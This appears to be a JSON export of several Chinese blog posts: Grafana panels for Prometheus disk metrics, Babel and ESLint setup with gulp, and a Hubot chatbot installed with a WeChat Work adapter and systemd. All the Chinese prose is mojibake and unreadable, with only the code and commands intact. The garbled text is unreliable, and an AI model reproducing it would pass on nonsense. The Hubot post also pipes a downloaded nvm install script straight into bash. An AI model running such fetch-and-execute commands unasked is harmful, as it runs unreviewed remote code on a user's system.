çš„ç©ºç™½å¤„éšä¾¿ç‚¹ä¸€ä¸‹ï¼Œå¤§æŠ˜çº¿å‡ºç°äº†ï¼Œè€Œä¸”ç»™å‡ºäº†æç¤ºï¼šTime series is monotonically increasing. Try applying a rate() function.\nå¬äººåŠï¼Œåƒé¥±é¥­ã€‚æˆ‘ä»¬æ”¹ä¸€ä¸‹ Metrics çš„æŸ¥è¯¢è¯­å¥ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯5åˆ†é’ŸæŠ“ä¸€æ¬¡æ•°æ®ï¼Œæ‰€ä»¥æ”¹æˆå¦‚ä¸‹æ ¼å¼ï¼š rate(node_disk_written_bytes_total{instance=\u0026quot;192.18.1.1:50000\u0026quot;}[5m])\nå†å¢åŠ ä¸€ä¸ªæŸ¥è¯¢ï¼ŒAdd Query åŒæ—¶æŠŠ read bytes å’Œ write bytes æ”¾è¿›ä¸€å¼ å›¾å»ï¼š\næœ€åä¿®æ­£ä¸€ä¸‹ï¼š\n1A: 2Metrics: rate(node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) 3Legend: sda read per second 4 5B: 6Metrics: rate(node_disk_written_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;}[5m]) 7Legend: sda write per second å†æŠŠæœ€å¤§ã€æœ€å°ã€å¹³å‡ã€å½“å‰ç»™å‡ºæ¥ï¼š\nè¿™æ ·å›¾å°±åšå¥½äº†ï¼Œæœ€åå®Œå·¥çš„ä¸¤å¼ å›¾ï¼š\næ‰€æœ‰ prometheus ä»å„ç§ exporter æ”¶ä¸Šæ¥çš„æ•°æ®éƒ½å¯ä»¥è¿™ä¹ˆå›¾å½¢åŒ–ï¼Œä»¥åç”»å›¾å°±ä¸°ç®€ç”±äººäº†ã€‚\n","date":"2022-01-18","img":"","permalink":"https://rendoumi.com/posts/20220118-grafana_prometheus/","series":null,"tags":null,"title":"Grafanaç”»å‡ºprometheusçš„å›¾"},{"categories":null,"content":"æœ€è¿‘å¼€å§‹å¼„hubotï¼Œé¡ºå¸¦ä¹Ÿå¼€å§‹å­¦ä¹  javascript ï¼Œé¦–å…ˆä»å•ç‹¬ä¸€ä¸ª nodejs é¡¹ç›®å¼€å§‹ï¼š\nnvm å’Œ node çš„å®‰è£…ä½¿ç”¨åœ¨å‰é¢å·²ç»è¯´è¿‡äº†ï¼š Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç† æ–°å»ºä¸€ä¸ªé¡¹ç›®ç›®å½•ï¼Œbuild01\nç„¶ååœ¨å…¶ä¸‹å»ºç«‹å¦‚ä¸‹ç›®å½•ç»“æ„ï¼š\n1mkdir build01 2 3cd build01 4mkdir es6 dist 5 6mkdir public 7cd public 8mkdir es6 dist è§£é‡Šä¸€ä¸‹ï¼Œes6 ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯çš„æºä»£ç ï¼Œdist ä¸‹æ”¾çš„æ˜¯æœåŠ¡å™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\npublic/es6 æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯çš„æºä»£ç ï¼Œpublic/dist æ”¾çš„æ˜¯æµè§ˆå™¨ç«¯å¤„ç†è¿‡çš„æºä»£ç ã€‚\nä¸€ã€å®‰è£…gulpå’Œbabel babel æ˜¯ç”¨æ¥åš js æ ¼å¼è½¬æ¢çš„ï¼Œæ³¨æ„ï¼ŒåŸæœ‰çš„ babel-preset-es2015 å·²ç»ä¸é€‚ç”¨äº†ã€‚\n1npm install --save-dev gulp gulp-babel babel-preset-env@next ç”Ÿæˆä¸€ä¸ª.babelrc æ–‡ä»¶ï¼Œå†…å®¹å°±ä¸€è¡Œ\n1{ \u0026#34;presets\u0026#34;: [\u0026#34;env\u0026#34;] } åœ¨ es6 ç›®å½•ä¸‹ï¼Œå»ºç«‹ä¸€ä¸ªæµ‹è¯•çš„ test.js æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1\u0026#39;use strict\u0026#39;; 2 3const sentences = [ 4 { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, 5 { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, 6]; 7 8function say({ subject, verb, object }) { 9 console.log(`${subject} ${verb} ${object}`); 10} 11 12for ( let s of sentences) { 13 say(s); 14} ä»”ç»†çœ‹ï¼Œä¸Šé¢è¿™ä¸ªæ–‡ä»¶ç”¨åˆ°äº† es6 çš„è¯­æ³•ï¼Œå¯¹è±¡çš„è§£æ„ï¼Œofè¯­æ³•ã€‚\næˆ‘ä»¬æ¥ç”¨ babel æŠŠå®ƒè½¬æ¢ä¸€ä¸‹ï¼Œå˜æˆ es5 çš„è¯­æ³•\nåœ¨build01ç›®å½•ä¸‹ï¼Œç”Ÿæˆgulpfile.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1const gulp = require(\u0026#39;gulp\u0026#39;); 2const babel = require(\u0026#39;gulp-babel\u0026#39;); 3 4 5gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ 6 7 gulp.src(\u0026#34;es6/**/*.js\u0026#34;) 8 .pipe(babel()) 9 .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); 10 11 gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) 12 .pipe(babel()) 13 .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); 14 15 done(); 16 17}); æ³¨æ„ä¸Šé¢ï¼Œ**è¡¨ç¤ºæ´ç©¿æ‰€æœ‰å­ç›®å½•ã€‚è¿è¡Œ gulp ï¼Œå°±ä¼šåœ¨ dist ç›®å½•ä¸‹ç”Ÿæˆæ–°çš„ test.js ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\n1\u0026#39;use strict\u0026#39;; 2 3var sentences = [{ 4 subject: \u0026#39;JavaScript\u0026#39;, 5 verb: \u0026#39;is\u0026#39;, 6 object: \u0026#39;great\u0026#39; 7}, { 8 subject: \u0026#39;Elephants\u0026#39;, 9 verb: \u0026#39;are\u0026#39;, 10 object: \u0026#39;large\u0026#39; 11}]; 12 13function say(_ref) { 14 var subject = _ref.subject, 15 verb = _ref.verb, 16 object = _ref.object; 17 console.log(\u0026#34;\u0026#34;.concat(subject, \u0026#34; \u0026#34;).concat(verb, \u0026#34; \u0026#34;).concat(object)); 18} 19 20for (var _i = 0; _i \u0026lt; sentences.length; _i++) { 21 var s = sentences[_i]; 22 say(s); 23} ä»”ç»†çœ‹ï¼Œes6 çš„è¯­æ³• å˜æˆ es5 çš„è¯­æ³•äº†ã€‚\näºŒã€å®‰è£…eslint babel æ˜¯å¯¹è¯­æ³•è¿›è¡Œè½¬æ¢ï¼Œé‚£ä¹ˆ eslint å°±æ˜¯å¯¹è¯­æ³•ä½œå‡ºè§„èŒƒï¼Œå¾ˆå¤šäººåƒ airbnb é‚£ä¸€å¥—è§„åˆ™ã€‚\n1npm install --save-dev eslint gulp-eslint gulp-if å®‰è£…å®Œæˆåæ‰§è¡Œå‘½ä»¤è¿›è¡Œåˆå§‹åŒ–ï¼š\n1eslint --init ä¼šæé—®ä¸€å †é—®é¢˜ï¼š\n1How would you like to use ESLint? â€¦ 2â–¸ To check syntax, find problems, and enforce code style 3 4What type of modules does your project use? â€¦ 5â–¸ JavaScript modules (import/export) 6 7Which framework does your project use? â€¦ 8 React 9 Vue.js 10â–¸ None of these 11 12Does your project use TypeScript? â€£ No / Yes 13 14#ä¸¤ä¸ªéƒ½é€‰å“¦ 15Where does your code run? â€¦ (Press \u0026lt;space\u0026gt; to select, \u0026lt;a\u0026gt; to toggle all, \u0026lt;i\u0026gt; to invert selection) 16âœ” Browser 17âœ” Node 18 19How would you like to define a style for your project? â€¦ 20â–¸ Answer questions about your style 21 22âœ” What format do you want your config file to be in? Â· JSON 23âœ” What style of indentation do you use? Â· 4 24âœ” What quotes do you use for strings? Â· single 25âœ” What line endings do you use? Â· unix 26âœ” Do you require semicolons? Â· Yes æœ€åå¾—åˆ°æ–‡ä»¶ .eslintrc.json\n1{ 2 \u0026#34;env\u0026#34;: { 3 \u0026#34;browser\u0026#34;: true, 4 \u0026#34;es2021\u0026#34;: true, 5 \u0026#34;node\u0026#34;: true 6 }, 7 \u0026#34;extends\u0026#34;: \u0026#34;eslint:recommended\u0026#34;, 8 \u0026#34;parserOptions\u0026#34;: { 9 \u0026#34;ecmaVersion\u0026#34;: 13, 10 \u0026#34;sourceType\u0026#34;: \u0026#34;module\u0026#34; 11 }, 12 \u0026#34;rules\u0026#34;: { 13 \u0026#34;indent\u0026#34;: [ 14 \u0026#34;error\u0026#34;, 15 4 16 ], 17 \u0026#34;linebreak-style\u0026#34;: [ 18 \u0026#34;error\u0026#34;, 19 \u0026#34;unix\u0026#34; 20 ], 21 \u0026#34;quotes\u0026#34;: [ 22 \u0026#34;error\u0026#34;, 23 \u0026#34;single\u0026#34; 24 ], 25 \u0026#34;semi\u0026#34;: [ 26 \u0026#34;error\u0026#34;, 27 \u0026#34;always\u0026#34; 28 ] 29 } 30} è¿™é‡Œæ³¨æ„ï¼Œè¦æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼š\n1\u0026#34;es2021\u0026#34;: true, 2æ”¹æˆ 3\u0026#34;es6\u0026#34;: true, 4 5\u0026#34;ecmaVersion\u0026#34;: 13, 6æ”¹æˆ 7\u0026#34;ecmaVersion\u0026#34;: 10, ç„¶åæˆ‘ä»¬æ”¹å†™ä¸€ä¸‹ gulpfile.jsï¼Œå¢åŠ  eslint çš„éƒ¨åˆ†\n1const gulp = require(\u0026#39;gulp\u0026#39;); 2const babel = require(\u0026#39;gulp-babel\u0026#39;); 3const eslint = require(\u0026#39;gulp-eslint\u0026#39;); 4const gulpIf = require(\u0026#39;gulp-if\u0026#39;); 5 6function isFixed(file) { 7 return file.eslint !== null \u0026amp;\u0026amp; file.eslint.fixed; 8} 9 10gulp.task(\u0026#39;default\u0026#39;, done =\u0026gt;{ 11 12 gulp.src([\u0026#34;es6/**/*.js\u0026#34;, \u0026#34;public/**/*.js\u0026#34;]) 13 .pipe(eslint({fix: true})) 14 .pipe(eslint.format()) 15 .pipe(gulpIf(isFixed, gulp.dest(file =\u0026gt; file.base))) 16 .pipe(eslint.failAfterError()); 17 18 19 gulp.src(\u0026#34;es6/**/*.js\u0026#34;) 20 .pipe(babel()) 21 .pipe(gulp.dest(\u0026#34;dist\u0026#34;)); 22 23 gulp.src(\u0026#34;public/es6/**/*.js\u0026#34;) 24 .pipe(babel()) 25 .pipe(gulp.dest(\u0026#34;public/dist\u0026#34;)); 26 27 done(); 28 29}); å†è¿è¡Œ gulp ï¼Œä¼šæŠŠ es6/test.js ç»™æ ¼å¼åŒ–å¥½ï¼Œå¯¹æ¯”ä¸€ä¸‹åŸæ–‡ä»¶å°±çŸ¥é“äº†ï¼Œident è¢«è°ƒæ•´æˆ4ä¸ªç©ºæ ¼äº†ï¼š\n1\u0026#39;use strict\u0026#39;; 2 3const sentences = [ 4 { subject: \u0026#39;JavaScript\u0026#39;, verb: \u0026#39;is\u0026#39;, object: \u0026#39;great\u0026#39; }, 5 { subject: \u0026#39;Elephants\u0026#39;, verb: \u0026#39;are\u0026#39;, object: \u0026#39;large\u0026#39; }, 6]; 7 8function say({ subject, verb, object }) { 9 console.log(`${subject} ${verb} ${object}`); 10} 11 12for ( let s of sentences) { 13 say(s); 14} ","date":"2022-01-04","img":"","permalink":"https://rendoumi.com/posts/20220104-javascript_babel_eslint/","series":null,"tags":null,"title":"Javascriptçš„é¡¹ç›®ä¸babelå’Œeslint"},{"categories":null,"content":"Hubotæ˜¯ä¸€ä¸ªé€šç”¨çš„èŠå¤©æœºå™¨äººï¼Œèƒ½å’Œå¾ˆå¤šèŠå¤©è½¯ä»¶é›†æˆï¼Œæ¯”å¦‚slackã€rockchatã€telegramã€ä¼ä¸šå¾®ä¿¡ã€IRCç­‰ã€‚\nå…¬å¸ç”¨çš„æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œä¹‹å‰ç”¨ç¾¤æœºå™¨äººå’Œ prometheus é›†æˆï¼Œå‘é€å„ç§å‘Šè­¦ä¿¡æ¯ï¼Œä½†æ˜¯ç¾¤æœºå™¨äººæ— æ³•æ¥æ”¶æ¶ˆæ¯ï¼›åŒæ—¶æˆ‘ä»¬æƒ³é›†æˆè¿›å»å¾ˆå¤šè‡ªå®šä¹‰å‘½ä»¤ï¼Œæ¯”å¦‚å‘é€æŒ‡ä»¤å°±å¼€å§‹ jenkins buildï¼Œå‘é€ ansible æŒ‡ä»¤æ‰§è¡Œï¼Œå‘é€æµé‡å›¾å°±è‡ªåŠ¨æŠŠæœºæˆ¿çš„æµé‡å›¾å‘è¿‡æ¥ï¼Œè¿™ä¸ªç¾¤æœºå™¨äººå°±ç”¨ä¸æˆäº†ã€‚æ‰€ä»¥å¿…é¡»å†ç›´æ¥ä¸€äº›ï¼Œæ„å»ºä¸€ä¸ªä¼ä¸šå¾®ä¿¡çš„åº”ç”¨ã€‚\nä¸€ã€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡ å®‰è£…å‰éœ€è¦åœ¨ä¼ä¸šå¾®ä¿¡ä¸­æ‹¿åˆ°4ä¸ªä¿¡æ¯ï¼š\nWECHATWORK_CORP_ID WECHATWORK_APP_AGENT_ID WECHATWORK_APP_SECRET WECHATWORK_AES_KEY é¦–å…ˆè”ç³»ä¼ä¸šå¾®ä¿¡ç®¡ç†å‘˜æ–°å¢ä¸€ä¸ªåº”ç”¨ï¼š\nåœ¨â€œç®¡ç†åå°-æˆ‘çš„ä¼ä¸šâ€ä¸­å¯ä»¥è·å¾—åœ°ä¸€ä¸ªä¿¡æ¯ï¼Œä¼ä¸š ID ä¿¡æ¯ï¼ŒCORP_ID ï¼š\næ‹¿æ‹¿ åœ¨â€œç®¡ç†åå°-åº”ç”¨ç®¡ç†-ç‚¹å‡»æŸå…·ä½“åº”ç”¨-è¯¦æƒ…â€é¡µä¸­å¯ä»¥è·å¾—äºŒã€ä¸‰ä¸ªä¿¡æ¯ï¼Œ APP_AGENT_ID å’Œ APP_SECRET\nç¬¬å››ä¸ª AES_KEY å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è¿›å…¥è¿™ä¸ªåº”ç”¨ï¼Œç‚¹å‡»é…ç½®çš„å›¾æ ‡ï¼š\nç„¶åè¿›å…¥ï¼Œç‚¹å‡»å¯ç”¨ API æ¥æ”¶\nç„¶åè®¾ç½®ä¸€ä¸‹\nurl å¡«å†™ https://hubot.rendoumi.com/wechatwork/webhook Token ç‚¹éšæœºè·å– EncodingAESKey ç‚¹éšæœºè·å–ï¼Œè¿™å°±æ˜¯å…·ä½“çš„ AESKey äº† ç„¶åç‚¹å‡»ä¿å­˜ï¼Œè¿™é‡Œå¿…ç„¶ä¼šå¤±è´¥ï¼æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è£…hubotå‘¢ã€‚æˆ‘ä»¬æŠŠè¿™ä¸‰ä¸ªåœ°æ–¹å…ˆè®°å½•ä¸‹æ¥ï¼Œéšåå†æ¥ç‚¹å‡»ä¿å­˜ã€‚\näºŒã€Hubot å®‰è£…å‰å‡†å¤‡ 1ã€æ³¨æ„ä¸Šé¢åœ°å€ï¼šURL åœ°å€æ˜¯ https ï¼Œç„¶å hubot çš„ç¼ºçœåœ°å€æ˜¯ http://xxx:8080 ï¼Œè¿™æ ·å¦‚æœå‰é¢æ²¡æœ‰è¯ä¹¦å¸è½½çš„è®¾å¤‡ï¼Œå°±å¾—æ­å»ºä¸€ä¸ªNginxï¼ˆhaproxyã€traefikï¼‰æ¥ä»£ç† https 443ç«¯å£åˆ°8080ã€‚\n2ã€Hubot æ˜¯æ”¯æŒ Coffeescript å’Œ nodejs çš„ï¼Œä»å®ƒçš„ Adapters ç½‘é¡µçœ‹\nhttps://hubot.github.com/docs/adapters/development/ é‡Œé¢éƒ½æ˜¯ coffee å‘³çš„å•ç®­å¤´å‡½æ•°ï¼Œå¯¼è‡´ä¸å¤ªç†Ÿæ‚‰çš„å…«æˆ’ä»¥ä¸ºåœ¨ wechatwork moduleå¯¼å‡ºçš„æ—¶å€™ä¹Ÿåº”è¯¥ç”¨å•ç®­å¤´å‡½æ•°ï¼Œç»“æœå°±æ‚²å‰§äº†ã€‚\næ‰€ä»¥åŠ¡å¿…æ¸…æ¥šï¼ŒAdapter çš„è¯­æ³•æ˜¯ jsï¼Œæ™®é€šè‡ªå»ºè‡ªåŠ¨å›å¤scriptå¯ä»¥ç”¨coffeescriptï¼Œåé¢ä¼šè¯¦ç»†è¯´è¿™ä¸€ç‚¹ã€‚\n3ã€å®‰è£…Hubotå¿…é¡»æ–°å»ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œä¸èƒ½ç”¨ root è£…\nç”¨ root ä¼šå¯¼è‡´ nodejs ä¸€å †æŠ¥é”™ï¼Œå…«æˆ’æ–°å»ºäº†ä¸€ä¸ªç”¨æˆ· botï¼Œå®¶ç›®å½•/home/botï¼Œç„¶åå†åœ¨è¿™ä¸‹é¢å»ºç«‹/home/bot/myhubotï¼Œåœ¨è¿™ä¸ªç›®å½•ä¸‹å®‰è£…ã€‚\nç†ç”±æ˜¯è¿™ä¸ªå¦‚æœç›´æ¥è£…åœ¨è¿™ä¸ªç”¨æˆ·çš„ home ç›®å½•ä¸‹ï¼Œä¼šå¯¼è‡´è¿™ä¸ªç”¨æˆ·åªèƒ½æœ‰è¿™ä¸€ä¸ªç”¨é€”äº†ï¼Œç›®å½•ç»“æ„å¤ªæµ…ï¼Œä¸€å †æ–‡ä»¶\n4ã€Hubotçš„å˜é‡å¼•å…¥éƒ½æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡å¼•å…¥çš„\næ‰€ä»¥æ— è®ºä»€ä¹ˆwechatworkè¿˜æ˜¯jenkinsï¼Œéƒ½éœ€è¦é€šè¿‡ç¯å¢ƒå˜é‡å¯¼å…¥å˜é‡\nä¸‰ã€å®‰è£…Hubot é¦–å…ˆå®‰è£…nvmï¼Œå‚çœ‹æ–‡ç«  Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç† 1curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash å®‰è£…çš„æ—¶å€™æœ€å¥½åŠ ä¸ª https_proxy ä»£ç†ï¼Œå› ä¸ºè¿™ä¸ª shell è„šæœ¬ä¸ç¿»å¢™å¾ˆéš¾ä¸‹ä¸‹æ¥ã€‚\nç„¶ååŠ¡å¿…å…³äº†ä»£ç†ï¼Œé€€å‡ºç»ˆç«¯å¹¶é‡æ–°è¿›å…¥ï¼Œå®‰è£… nodejs çš„æœ€æ–°ç‰ˆæœ¬\n1nvm ls-remote 2nvm install v16.13.1 3nvm list ç¡®è®¤ä¸€ä¸‹ï¼Œnodejs çš„ç‰ˆæœ¬ç¼ºçœæ˜¯ v16.13.1\nè¿™é‡Œåƒä¸‡ä¸è¦æ‰‹æ¬ æŠŠ npm çš„æºæ¢æˆå›½å†…çš„è…¾è®¯ç­‰ï¼Œå°±æ˜¯å›½å¤–æº\nç„¶åå®‰è£…hubotï¼Œå¹¶åˆå§‹åŒ–\n1su - bot 2npm install -g yo generator-hubot 3 4mkdir /home/bot/myhubot 5cd /home/bot/myhubot 6yo hubot ä¼šé—®å‡ ä¸ªé—®é¢˜ï¼š\nOwerï¼šå†™è‡ªå·±é‚®ç®±å°±è¡Œ Bot name: bot Description: rendoumi corp Bot adapter: campfire æ³¨æ„æœ€åä¸€ä¸ªï¼Œé€‰campfireå°±å¥½ï¼Œæˆ‘ä»¬ç¨åå†è£…wechatwork\n1 _____________________________ 2 / \\ 3 //\\ | Extracting input for | 4 ////\\ _____ | self-replication process | 5 //////\\ /_____\\ \\ / 6 ======= |[^_/\\_]| /---------------------------- 7 | | _|___@@__|__ 8 +===+/ /// \\_\\ 9 | |_\\ /// HUBOT/\\\\ 10 |___/\\// / \\\\ 11 \\ / +---+ 12 \\____/ | | 13 | //| +===+ 14 \\// |xx| 15 16? Owner zhangranrui@rendoumi.com 17? Bot name bot 18? Description rendoumi corp 19? Bot adapter campfire ç„¶åå°±ä¼šæ˜¯æ¼«é•¿çš„ç­‰å¾…ï¼š\næœ€åä¼šæŠ¥å‡ ä¸ªè­¦å‘Šï¼Œä¸ç”¨ç®¡ï¼Œå¿½ç•¥å³å¯ã€‚\n1npm notice created a lockfile as package-lock.json. You should commit this file. 2+ hubot-help@1.0.1 3+ hubot-google-images@0.2.7 4+ hubot-rules@1.0.0 5+ hubot-shipit@0.2.1 6+ hubot-redis-brain@1.0.0 7+ hubot-google-translate@0.2.1 8+ hubot-diagnostics@1.0.0 9+ hubot-scripts@2.17.2 10+ hubot@3.3.2 11+ hubot-maps@0.0.3 12+ hubot-heroku-keepalive@1.0.3 13+ hubot-pugme@0.1.1 14added 99 packages from 53 contributors and audited 99 packages in 20.176s 15 162 packages are looking for funding 17 run `npm fund` for details 18 19found 1 low severity vulnerability 20 run `npm audit fix` to fix them, or `npm audit` for details æˆ‘ä»¬å…ˆè·‘ä¸€ä¸‹ï¼Œç®€å•æµ‹ä¸€ä¸‹åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„bot nameè¾“å…¥çš„æ˜¯bot\n1cd /home/bot/myhubot 2 3./bin/hubot 4 5#è¿›å…¥å 6bot ping 7 8#å¾—åˆ°å›åº” 9PONG è¿™æ ·å°±è£…å¥½äº† hubotï¼Œæˆ‘ä»¬åšä¸€ä¸‹ä¿®æ”¹ï¼Œå»æ‰ heroku å’Œ redisï¼Œå¦åˆ™ä¼šä¸åœä¸¢å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œä½†æ˜¯ä¸è¦ç”¨ npm å»åˆ é™¤è¿™ä¸¤ä¸ªåŒ…ï¼Œæ”¾ç€é‚£é‡Œå¤‡ç”¨ä¹Ÿä¸å å¤šå°‘ç©ºé—´çš„\n1cd /home/bot/myhubot 2 3vi external-scripts.json 4[ 5 \u0026#34;hubot-diagnostics\u0026#34;, 6 \u0026#34;hubot-help\u0026#34;, 7 \u0026#34;hubot-heroku-keepalive\u0026#34;, 8 \u0026#34;hubot-google-images\u0026#34;, 9 \u0026#34;hubot-google-translate\u0026#34;, 10 \u0026#34;hubot-pugme\u0026#34;, 11 \u0026#34;hubot-maps\u0026#34;, 12 \u0026#34;hubot-redis-brain\u0026#34;, 13 \u0026#34;hubot-rules\u0026#34;, 14 \u0026#34;hubot-shipit\u0026#34; 15] 16 17#å»æ‰ä¸‹é¢ä¸¤è¡Œ 18hubot-heroku-keepalive 19hubot-redis-brain ä¸‰ã€å®‰è£…å¾®ä¿¡ Adapter Adapter æ’ä»¶ï¼Œhubotæ˜¯ä¸€å¥—ç³»ç»Ÿï¼Œé€šè¿‡å„ç§æ’ä»¶è·Ÿå„ç§èŠå¤©è½¯ä»¶è¿›è¡Œäº¤äº’\nå¾®ä¿¡æ’ä»¶åŸå§‹åœ°å€ï¼šhttps://github.com/billtt/hubot-wechatwork\nå…«æˆ’ç¨å¾®æ”¹äº†ä¸€ä¸‹ï¼šhttps://github.com/zhangrr/hubot-wechatwork\nä¸»è¦æ˜¯æ·»åŠ äº†ä¸ªè‡ªåŠ¨å›åº”å’Œæ·»åŠ äº†ä¸€äº›è°ƒè¯•ä¿¡æ¯ï¼Œå¦åˆ™ä¸çŸ¥é“åŠ è½½æˆä¸æˆåŠŸã€‚\n1#å…ˆè£…é‚£ä¸ªè€çš„ 2cd /home/bot/myhubot 3npm install hubot-wechatwork 4 5#è¦†ç›–æ‰è€çš„æ¨¡å— 6cd /home/bot/myhubot/node_modules 7git clone https://github.com/zhangrr/hubot-wechatwork å¯åŠ¨ä¹‹å‰æ™®åŠä¸€ä¸‹ hubot åŸºæœ¬çŸ¥è¯†ï¼Œhubot ä¸­å˜é‡çš„ä¼ å…¥éƒ½æ˜¯é€šè¿‡ç¯å¢ƒå˜é‡å¯¼å…¥çš„ï¼Œå¯åŠ¨æµ‹è¯•ä¸€ä¸‹wechatwork\n1export WECHATWORK_CORP_ID=aaaa 2export WECHATWORK_APP_AGENT_ID=bbbb 3export WECHATWORK_APP_SECRET=cccc 4export WECHATWORK_AES_KEY=dddd 5 6cd /home/bot/myhubot 7./bin/hubot -a wechatwork çœ‹åˆ°ä¿¡æ¯ï¼ŒINFO Yunwei: loading wechatwork Adapterï¼Œè¯´æ˜å¯åŠ¨æ²¡å•¥æ¯›ç—…\nç„¶åæˆ‘ä»¬å›åˆ°ä¼ä¸šå¾®ä¿¡è¿™ä¸ªåº”ç”¨çš„åº”ç”¨ç®¡ç†ï¼Œç‚¹å‡»ä¿å­˜æ¥æ”¶æ¶ˆæ¯æœåŠ¡å™¨é…ç½®ï¼Œè¿™æ¬¡å°±åº”è¯¥èƒ½æˆåŠŸäº†ã€‚\næµ‹è¯•ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨ä¼ä¸šå¾®ä¿¡ä¸­ï¼Œå¯¹è¿™ä¸ªåº”ç”¨æœºå™¨äººç§èŠï¼Œå‘ä¸ª hiï¼š\nå†å‘ä¸ªhelpï¼Œä¼šå†’å‡ºä¸€å †ä¿¡æ¯\nç„¶åæˆ‘ä»¬å¯ä»¥è¯•è¯•æŒ‡ä»¤ï¼Œå†å‘ä¸ªpingï¼Œæœºå™¨äººå›PONGï¼Œè¿™å°±ç®—æ­£å¸¸å·¥ä½œäº†\nåŒæ—¶æˆ‘ä»¬åœ¨ç»ˆç«¯ä¹Ÿå¯ä»¥çœ‹åˆ°æ¥æ”¶åˆ°çš„æ¶ˆæ¯\nè¦æ³¨æ„çš„å‘½ä»¤ï¼š wechatwork æœ‰ä¸€æ¡å‘½ä»¤ chat create CHATID USER1,USER2,USER3,\u0026hellip;\nè§£é‡Šä¸€ä¸‹ï¼Œæ˜¯ç”¨æ¥å»ºç«‹ä¸€ä¸ªä¼ä¸šå¾®ä¿¡ç¾¤èŠçš„ï¼Œç¾¤ä¸»é»˜è®¤æ˜¯ç¬¬ä¸€ä¸ªäººï¼š\nchatid æ˜¯æŒ‡ä¸€ä¸ªç¾¤èŠçš„ id å·ï¼Œæ ¼å¼æ˜¯å­—æ¯+æ•°å­—ï¼Œæ¯”å¦‚yunwei001ï¼Œè¿™ä¸ªä¸€æ—¦åˆ›å»ºå°±æ— æ³•é”€æ¯ï¼Œä¼šæ°¸è¿œä¿å­˜åœ¨ä¼ä¸šå¾®ä¿¡é‚£é‡Œï¼Œåˆ‡åˆ‡è®°ä½ï¼ï¼ï¼\nuser1,user2 è¿™ç§æ˜¯å‘˜å·¥ä¼ä¸šå¾®ä¿¡çš„idï¼Œé€šå¸¸æ˜¯ç”¨æˆ·åå…¨ç§°ï¼Œæ¯”å¦‚ zhangrenren,liudaqiang\næ‰€ä»¥è¯´çš„æ—¶å€™åŠ¡å¿…è¦å°å¿ƒï¼Œä¸‡ä¸‡è®°ä½ chatid ä¸€æ—¦å»ºç«‹å°±æ— æ³•æ”¶å›ã€‚\nä¹‹åå¯ä»¥è°ƒç”¨ sendChatMessage æ¥ç»™ç¾¤èŠå‘é€æ¶ˆæ¯ã€‚\nå››ã€å‡†å¤‡systemdå¯åŠ¨hubot è¿™æ ·ä¸èƒ½æ¯æ¬¡ç”¨ä¸ªç»ˆç«¯å¯åŠ¨ hubot å§ï¼Œå†™ä¸ª systemd æ–‡ä»¶æ¥å¤„ç†å§\nç”±äºæˆ‘ä»¬ç”¨åˆ°äº†nvmï¼Œè¿™é‡Œç¡®å®éœ€è¦ä¸€äº›æŠ€å·§ï¼Œcat /etc/systemd/system/hubot.service\n1[Unit] 2Description=Hubot 3Requires=network.target 4After=network.target 5 6[Service] 7Type=simple 8WorkingDirectory=/home/bot/myhubot 9User=bot 10 11Restart=always 12TimeoutStartSec=10 13RestartSec=10 14 15; Configure Hubot environment variables, use quotes around vars with whitespace as shown below. 16; Environment=\u0026#34;HUBOT_SLACK_TOKEN=SLACK_TOKEN\u0026#34; 17; Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; 18; Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; 19Environment=\u0026#34;NODE_VERSION=default\u0026#34; 20Environment=\u0026#34;WECHATWORK_CORP_ID=aaaa\u0026#34; 21Environment=\u0026#34;WECHATWORK_APP_AGENT_ID=bbbb\u0026#34; 22Environment=\u0026#34;WECHATWORK_APP_SECRET=cccc\u0026#34; 23Environment=\u0026#34;WECHATWORK_AES_KEY=dddd\u0026#34; 24 25ExecStart=/home/bot/.nvm/nvm-exec /home/bot/myhubot/bin/hubot --adapter wechatwork 26 27[Install] 28WantedBy=multi-user.target æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æŒ‡å®šäº†ç¯å¢ƒå˜é‡ NODE_VERSION=defaultï¼Œä»¥åŠæœ€ä¸‹çš„ ExecStartï¼Œç¡®å®šç”¨ nvm-exec å¼•åŠ¨ node\nå¦å¤–æŠŠ wechatwork æ‰€éœ€çš„4ä¸ªå‚æ•°ä¹Ÿæ”¾è¿›ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·é‡å¯å°±å¯ä»¥äº†\n1systemctl daemon-reload 2systemctl start hubot äº”ã€é›†æˆjenkins å‡†å¤‡çŸ¥è¯†ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ jenkins æ‹¿åˆ°ç”¨æˆ·åå’Œ 